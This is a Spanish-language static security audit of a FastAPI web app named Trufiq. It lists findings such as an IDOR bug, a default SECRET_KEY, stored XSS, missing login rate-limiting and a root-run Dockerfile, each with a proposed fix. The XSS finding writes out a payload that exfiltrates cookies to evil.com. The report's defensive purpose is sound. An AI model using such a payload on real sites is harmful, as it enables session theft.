# Informe de Auditoría de Arquitectura y Seguridad — Trufiq

**Fecha:** 2025  
**Alcance:** Revisión completa de código fuente, configuración, modelos, servicios, routers, templates, tests y despliegue.  
**Método:** Análisis estático de código (sin ejecución). 25 migraciones Alembic revisadas. 13 fases de auditoría ejecutadas.

---

## Leyenda de severidad

| Símbolo | Nivel | Criterio |
|---------|-------|----------|
| 🔴 | **CRÍTICO** | Vulnerabilidad explotable o fallo funcional grave. Arreglar inmediatamente. |
| 🟠 | **ALTO** | Riesgo real de seguridad o integridad de datos. Arreglar en próximo sprint. |
| 🟡 | **MEDIO** | Deuda técnica o riesgo potencial controlable. Planificar. |
| 🟢 | **BAJO** | Buenas prácticas no seguidas, impacto mínimo. Registrar como backlog. |
| ✅ | **POSITIVO** | Implementación correcta, destacada como referencia. |

---

## Tabla de hallazgos

| # | Severidad | Hallazgo | Ubicación |
|---|-----------|----------|-----------|
| F-01 | 🔴 | QR Scan: `user_id` pasado como `tenant_id` — fallo funcional + IDOR potencial | `app/routers/scan.py` L63, L100 |
| F-02 | 🔴 | `SECRET_KEY` con valor por defecto inseguro sin validación en arranque | `app/config.py` |
| F-03 | 🟠 | XSS almacenado: plot names y categorías en `json.dumps()` sin escapar `<>` → `\| safe` | `app/services/charts_service.py` + templates |
| F-04 | 🟠 | Sin rate-limiting en `/login` — fuerza bruta sin restricción | `app/routers/auth.py` |
| F-05 | 🟠 | `Float` para importes financieros — imprecisión IEEE 754 en cálculos monetarios | `app/models/expense.py`, `income.py` |
| F-06 | 🟠 | Tokens de reset de contraseña reutilizables en la ventana de 1h | `app/services/token_service.py` |
| F-07 | 🟠 | Dockerfile sin directiva `USER` — el contenedor corre como root | `Dockerfile` |
| F-08 | 🟡 | Sin protección CSRF en formularios POST | Todos los routers |
| F-09 | 🟡 | `/metrics` accesible sin token si `METRICS_TOKEN` no está configurado | `app/main.py` + `fly.toml` |
| F-10 | 🟡 | Schemas Pydantic sin validadores de longitud máxima en strings | `app/schemas/` |
| F-11 | 🟡 | `TenantMembership.role` sin restricción de valores a nivel de DB | `app/models/tenant.py` |
| F-12 | 🟡 | Dockerfile monofase — herramientas de build en imagen de producción | `Dockerfile` |
| F-13 | 🟡 | `entrypoint.sh` lanza migraciones sin esperar disponibilidad de PostgreSQL | `docker/entrypoint.sh` |
| F-14 | 🟢 | Credenciales débiles en `docker-compose.yml` (solo dev, aceptable) | `docker-compose.yml` |
| F-15 | 🟢 | Sin límite de longitud en campo `username` al registrar | `app/routers/auth.py` |
| F-16 | 🟢 | Recibos almacenados como `LargeBinary` en DB en vez de object storage | `app/models/expense.py` |

---

## Detalle de hallazgos críticos

### F-01 🔴 — QR Scan: IDOR + Error de runtime

**Archivos:** `app/routers/scan.py` líneas 63 y 100–113

**Código problemático:**
```python
# GET /scan/{token}  →  línea ~63
plant = await plants_service.get_plant(db, plant_id, request.session["user_id"])

# POST /scan/{token}  →  línea ~100
plant = await plants_service.get_plant(db, plant_id, request.session["user_id"])
last_event = await truffle_events_service.create_event(
    db,
    plant_id=plant.id,
    plot_id=plant.plot_id,
    user_id=request.session["user_id"],   # ← kwarg inexistente
    ...
)
```

**Firma real de las funciones:**
```python
# plants_service
async def get_plant(db, plant_id: int, tenant_id: int) -> Optional[Plant]

# truffle_events_service
async def create_event(db, *, plant_id, plot_id, tenant_id, acting_user_id=None, ...)
```

**Problema:**
1. `get_plant` filtra por `tenant_id` pero recibe `user_id`. Tras la migración multi-tenancy, `user_id != tenant_id`, por lo que **siempre devuelve `None`** → la función QR está completamente rota para todos los usuarios.  
2. `create_event` recibe el kwarg `user_id=...` que **no existe en la firma** → `TypeError` en runtime si algún usuario llega a ese punto.

**Corrección:**
```python
# GET y POST:
plant = await plants_service.get_plant(db, plant_id, request.session["active_tenant_id"])

# POST — create_event:
last_event = await truffle_events_service.create_event(
    db,
    plant_id=plant.id,
    plot_id=plant.plot_id,
    tenant_id=request.session["active_tenant_id"],
    acting_user_id=request.session["user_id"],
    ...
)
```

---

### F-02 🔴 — SECRET_KEY sin validación en arranque

**Archivo:** `app/config.py`

```python
SECRET_KEY: str = "change-me-in-production-please"
```

Si se despliega sin sobreescribir esta variable, todos los tokens basados en `itsdangerous` (sesiones, reset de contraseña, confirmación de email) son **predecibles y falsificables**.

**Corrección recomendada** — añadir validador en `app/config.py`:
```python
from pydantic import field_validator

@field_validator("SECRET_KEY")
@classmethod
def secret_key_must_be_strong(cls, v: str) -> str:
    insecure_defaults = {"change-me-in-production-please", "secret", ""}
    if v in insecure_defaults or len(v) < 32:
        raise ValueError(
            "SECRET_KEY must be at least 32 chars and not a known default. "
            "Generate one with: python -c \"import secrets; print(secrets.token_hex(32))\""
        )
    return v
```

---

## Detalle de hallazgos altos

### F-03 🟠 — XSS Almacenado en gráficas Chart.js

**Archivos:** `app/services/charts_service.py`, `app/templates/graficas/index.html`, `app/templates/kpis/index.html`

**Código vulnerable:**
```python
# charts_service.py
plot_labels = [plot.name for plot in all_plots]      # nombres controlados por usuario
expense_cat_labels = [item[0] for item in sorted_cat_exp]  # categorías controladas por usuario
cat_datasets = [{"label": cat, "data": ..., ...} for cat in all_cats]  # idem

return {
    "plot_labels": json.dumps(plot_labels),          # json.dumps NO escapa < > &
    "expense_cat_labels": json.dumps(expense_cat_labels),
    "cat_datasets": json.dumps(cat_datasets),
    ...
}
```

En el template:
```html
<script>
  const plotLabels = {{ plot_labels | safe }};  <!-- XSS si plot_labels contiene </script> -->
</script>
```

**Vector de ataque:**  
Un usuario crea una parcela con nombre `</script><img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`.  
`json.dumps()` NO escapa `<`, `>`, ni `/`, por lo que el HTML resultante cierra el `<script>` y ejecuta JavaScript arbitrario en el navegador de cualquier miembro del tenant.

**Corrección:** Usar un helper que escape los caracteres peligrosos en el JSON antes de pasar a `| safe`:

```python
# app/jinja.py — registrar filtro
import json
from markupsafe import Markup

def tojson_safe(value) -> Markup:
    """json.dumps with < > & escaped for safe embedding in <script> tags."""
    return Markup(
        json.dumps(value)
        .replace("<", r"\u003c")
        .replace(">", r"\u003e")
        .replace("&", r"\u0026")
    )

# Registrar en Jinja2 environment:
templates.env.filters["tojson_safe"] = tojson_safe
```

Luego en los servicios, pasar los datos **sin** `json.dumps()` y aplicar el filtro en el template:
```html
const plotLabels = {{ plot_labels | tojson_safe }};
```

O simplemente, en los servicios usar:
```python
import json
def _safe_json(v) -> str:
    return json.dumps(v).replace("<", r"\u003c").replace(">", r"\u003e").replace("&", r"\u0026")
```

---

### F-04 🟠 — Sin rate-limiting en `/login`

**Archivo:** `app/routers/auth.py`

El endpoint `POST /login` no tiene rate limiting, lockout de cuentas ni CAPTCHA. Un atacante puede hacer ataques de diccionario contra cualquier email conocido. El asistente IA sí tiene rate limiting (F-04 positivo), pero el login no.

**Corrección mínima:** Usar `slowapi` o limitar intentos por IP con la misma lógica de ventana deslizante que el asistente usa en sesión. Alternativamente, añadir un delay progresivo en respuesta:

```python
# En routers/auth.py — tras un intento fallido:
import asyncio
await asyncio.sleep(min(2 ** failed_attempts, 30))  # backoff exponencial
```

La solución robusta es `slowapi` integrado con el middleware de FastAPI.

---

### F-05 🟠 — Float para importes financieros

**Archivos:** `app/models/expense.py`, `app/models/income.py`, `app/models/plot.py`

```python
# expense.py
amount: Mapped[float]          # SQLAlchemy Float = IEEE 754 double

# income.py
amount_kg: Mapped[float]
euros_per_kg: Mapped[float]
```

`Float` en SQLAlchemy mapea a `DOUBLE PRECISION` en PostgreSQL. Los cálculos acumulados de muchas transacciones pueden derivar céntimos (e.g., `0.1 + 0.2 = 0.30000000000000004`).

**Corrección:**
```python
from sqlalchemy import Numeric

amount: Mapped[Decimal] = mapped_column(Numeric(12, 2), nullable=False)
euros_per_kg: Mapped[Decimal] = mapped_column(Numeric(10, 4), nullable=False)
```
Requiere migración Alembic: `ALTER TABLE expenses ALTER COLUMN amount TYPE NUMERIC(12,2)`.

---

### F-06 🟠 — Password reset token reutilizable

**Archivo:** `app/services/token_service.py`

Los tokens de reset generados con `URLSafeTimedSerializer` son stateless. Si un usuario solicita reset, usa el link, pero un atacante interceptó el email, el atacante puede reutilizar el mismo token durante toda la ventana de 1 hora.

**Corrección:** Añadir una columna `password_reset_token_hash` a `User`. Al generar: almacenar hash. Al verificar: comparar y borrar. Hace el token de un solo uso:

```python
# Al generar token
user.password_reset_token_hash = hash_token(raw_token)

# Al verificar y cambiar contraseña
if not verify_token_hash(user.password_reset_token_hash, raw_token):
    raise InvalidTokenError()
user.password_reset_token_hash = None  # invalida
await db.commit()
```

---

### F-07 🟠 — Dockerfile sin USER (corre como root)

**Archivo:** `Dockerfile`

Actualmente el contenedor ejecuta el proceso uvicorn como `root`. Si hay una vulnerabilidad de escape de contenedor, el atacante tiene privilegios de root.

**Corrección:**
```dockerfile
# Añadir al final del Dockerfile, antes de CMD:
RUN adduser --disabled-password --gecos "" appuser
USER appuser
```

---

## Detalle de hallazgos medios

### F-08 🟡 — Sin protección CSRF

FastAPI no incluye CSRF por defecto. La cookie de sesión tiene `SameSite=lax` (configurado correctamente en `main.py`), lo que previene la mayoría de ataques CSRF cross-origin, **pero no los GET navigation que derivan en POST** ni formularios en subdominios del mismo eTLD.

Para una protección robusta, añadir `starlette-csrf` o implementar el patrón Double-Submit Cookie para los endpoints de mutación.

---

### F-09 🟡 — Endpoint `/metrics` sin protección si METRICS_TOKEN no está configurado

**Archivo:** `app/main.py` + `fly.toml`

Si `METRICS_TOKEN` no se configura en el entorno, cualquiera puede acceder a `/metrics` y ver nombres de parcelas, recuentos de endpoints, errores, etc. Fly.io expone el puerto 8000 públicamente.

**Verificar:** Asegurar que `METRICS_TOKEN` esté siempre definido en variables de entorno de producción. Añadir validación en startup:
```python
if settings.METRICS_ENABLED and not settings.METRICS_TOKEN:
    raise RuntimeError("METRICS_TOKEN must be set when METRICS_ENABLED=true")
```

---

### F-10 🟡 — Schemas sin validadores de longitud

**Archivo:** `app/schemas/`

Campos como `description`, `category`, `person` en `ExpenseCreate`, `IncomeCreate`, `PlotCreate` aceptan strings de longitud arbitraria. Esto puede provocar:
- Truncado silencioso en DB (si columna tiene `String(N)`)
- Errores de DB no controlados
- Lentitud por strings muy grandes en búsquedas

**Corrección:**
```python
from pydantic import Field

class ExpenseCreate(BaseModel):
    description: str = Field(..., max_length=500)
    category: Optional[str] = Field(None, max_length=100)
    person: str = Field("", max_length=200)
```

---

### F-11 🟡 — `TenantMembership.role` sin constraint de DB

**Archivo:** `app/models/tenant.py`

```python
role: Mapped[str] = mapped_column(String(20), nullable=False, default="user")
```

Cualquier string de hasta 20 caracteres puede almacenarse como `role`. No hay CHECK constraint en DB ni enum Pydantic.

**Corrección:**
```python
# Modelo
from sqlalchemy import CheckConstraint
__table_args__ = (
    CheckConstraint("role IN ('admin', 'user')", name="ck_tenant_membership_role"),
)

# O en Pydantic:
from typing import Literal
role: Literal["admin", "user"] = "user"
```

---

### F-12 🟡 — Dockerfile monofase

**Archivo:** `Dockerfile`

El stage de build y el de runtime son el mismo. La imagen final incluye `build-essential`, compiladores y headers que no son necesarios en producción, aumentando la superficie de ataque.

**Corrección:** Migrar a build multietapa:
```dockerfile
FROM python:3.11-slim AS builder
RUN apt-get install -y build-essential
COPY pyproject.toml .
RUN pip install --prefix=/install ...

FROM python:3.11-slim
COPY --from=builder /install /usr/local
```

---

### F-13 🟡 — `entrypoint.sh` sin esperar disponibilidad de PostgreSQL

**Archivo:** `docker/entrypoint.sh`

Si PostgreSQL tarda en arrancar, `alembic upgrade head` falla y el contenedor muere. En despliegues multi-contenedor sin health checks, esto provoca caídas en arranque frío.

**Corrección:** Añadir un loop de espera:
```bash
until pg_isready -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER"; do
    echo "Waiting for PostgreSQL..."
    sleep 1
done
```
O usar `wait-for-it.sh` de terceros.

---

## Aspectos positivos destacados ✅

| Área | Detalle |
|------|---------|
| **Autenticación** | Argon2 para hashing de contraseñas vía `passlib` — algoritmo moderno con cost factor adecuado |
| **Comparación constante** | `verify_password` usa `passlib` → timing attack imposible |
| **Validación de contraseñas** | Límite 8-72 bytes enforced correctamente (límite real de bcrypt/argon2) |
| **Cookie de sesión** | `SameSite=lax` y `https_only=True` en producción — configurado en `main.py` |
| **Open Redirect** | `_safe_next()` en `auth.py` valida la URL de redirección post-login |
| **Webhook Stripe** | Verificación de firma HMAC antes de procesar cualquier evento |
| **Plan allowlist** | Planes de billing validados contra `("basic", "premium", "enterprise")` |
| **Admin routes** | Todos los endpoints `/admin/` usan `Depends(require_admin)` consistentemente |
| **Multi-tenancy** | `active_tenant_id` usado en todos los servicios de datos (gastos, ingresos, parcelas, etc.) |
| **Rate limiting asistente IA** | 20 peticiones / 5 min por sesión, ventana deslizante |
| **Prompt injection guards** | `_INJECTION_PATTERNS` + `_MAX_MESSAGE_LEN=1000` en `assistant_service.py` |
| **Contexto IA pre-agregado** | El LLM solo recibe resúmenes numéricos, nunca queries a DB directas |
| **SIGPAC proxy** | URL hardcodeada + validación numérica de todos los parámetros → sin SSRF |
| **Email** | Postmark vía HTTP API (JSON) → sin riesgo de header injection |
| **Timeouts externos** | AEMET y ibericam con timeouts explícitos configurables |
| **Exports** | Todos los exports filtran por `tenant_id` — sin fuga cross-tenant |
| **Imports** | `import_service.py` filtra por `tenant_id` antes de insertar |
| **Observabilidad** | Sentry + Prometheus + structured JSON logging — stack completo |
| **Sentry cron** | Scripts de cron configuran Sentry correctamente con `service_name` propio |
| **Tests** | 82%+ cobertura, suite de integración con SQLite async, `FakeExecuteResult` para unit tests |
| **i18n** | Babel + `gettext` para internacionalización, locales para ES/EN/FR |

---

## Plan de acción recomendado

### Sprint inmediato (esta semana)

1. **F-01**: Corregir `scan.py` — cambiar `user_id` → `active_tenant_id` y `user_id=` → `acting_user_id=` en `create_event`. Tests de integración para el flujo QR.

2. **F-02**: Añadir `field_validator` en `config.py` que rechace el valor por defecto de `SECRET_KEY`. Añadir instrucción en `README.md` y `.env.example` para generar uno seguro.

3. **F-03**: Implementar filtro `tojson_safe` en Jinja2 y sustituir los 20 usos de `| safe` sobre datos JSON que incluyan strings de usuario por `| tojson_safe`.

### Próximo sprint (2 semanas)

4. **F-04**: Añadir rate limiting en endpoint de login (mínimo: delay progresivo o `slowapi`).

5. **F-06**: Implementar invalidación de token de reset de contraseña (columna `password_reset_token_hash` en `users`).

6. **F-07**: Añadir `USER appuser` al `Dockerfile`.

7. **F-09**: Añadir validación en startup que falle si `METRICS_ENABLED=true` y `METRICS_TOKEN` está vacío.

8. **F-10**: Añadir `max_length` a todos los campos string en `app/schemas/`.

9. **F-11**: Añadir `CheckConstraint` a `TenantMembership.role` o migrar a `Literal["admin", "user"]` en Pydantic.

### Backlog técnico (próxima iteración)

10. **F-05**: Migrar `Float` a `Numeric(12,2)` para importes — requiere migración Alembic con conversión de tipos.

11. **F-08**: Evaluar `starlette-csrf` para protección CSRF completa.

12. **F-12**: Migrar Dockerfile a build multietapa.

13. **F-13**: Añadir wait-for-postgres en `entrypoint.sh`.

14. **F-16**: Mover receipts a object storage (Fly Tigris / S3) y guardar solo la URL en DB.

---

## Evaluación global

| Dimensión | Puntuación | Comentario |
|-----------|-----------|------------|
| Seguridad de autenticación | 7/10 | Argon2 + SameSite bien. Falta rate limit en login y invalidación de tokens. |
| Multi-tenancy | 9/10 | Implementación consistente. Solo fallo en scan.py post-migración. |
| Integridad de datos | 6/10 | Float para dinero es deuda técnica seria. |
| XSS/Inyección | 6/10 | `| safe` + `json.dumps` sin escapar `<>` es XSS almacenado real. |
| Arquitectura de capas | 9/10 | Separación router/service/model respetada en todo el codebase. |
| Observabilidad | 9/10 | Stack completo: Sentry, Prometheus, logs JSON estructurados, cron Sentry. |
| Cobertura de tests | 8/10 | 82%+ cobertura. Faltan tests de seguridad para IDOR. |
| Hardening de despliegue | 5/10 | Dockerfile sin USER, monofase, sin wait-for-db. |
| **Global** | **7/10** | Codebase sólido con buen arquitectura, dos críticos puntuales a resolver de inmediato. |

---

*Informe generado mediante análisis estático exhaustivo del código fuente. No se ejecutó el sistema en ningún entorno durante esta auditoría.*
